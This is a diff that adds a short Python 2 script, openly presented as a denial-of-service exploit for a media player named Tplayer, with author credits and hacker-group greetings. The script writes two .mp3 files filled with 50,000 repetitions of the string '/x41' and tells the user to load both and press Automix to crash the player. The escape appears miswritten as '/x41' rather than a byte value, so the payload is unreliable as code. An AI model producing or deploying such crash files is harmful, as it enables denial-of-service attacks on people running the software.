@@ -1,0 +1,21 @@
+#!/usr/bin/python
+print "--------------------Exploit By 41.w4r10r------------------------------\n"
+print "-------------------41.w4r10r@gmail.com-----------------------------\n"
+print "----------------Tplayer V1R10 DoS Exploit------------------------------\n"
+print "-------------Vendor Site : http://www.flicenr.ca-------------------------\n"
+print "Greets:B0nd, Ne0, Godwin_Austin, Fb1H2s, Eberly, Punter, The_Empty(), DZZ, Micr0 \n \n"
+print "  Catch Us :  www.Garahe4hackers.com | www.Andhrahackers.com | www.ICW.in \n \n"
+print "-------------------------Indian Hackers Rock-----------------------------------"
+
+junk = "/x41" * 50000;
+filename = "crash.mp3";
+file = open(filename,"w")
+file.writelines(junk)
+file.close()
+filename2="crash2.mp3";
+file=open(filename2,"w")
+file.writelines(junk)
+file.close()
+print "Two Files Created "
+print "[+]Usage: Load both of Created Files in player and click on Automix Button :)"
+raw_input()
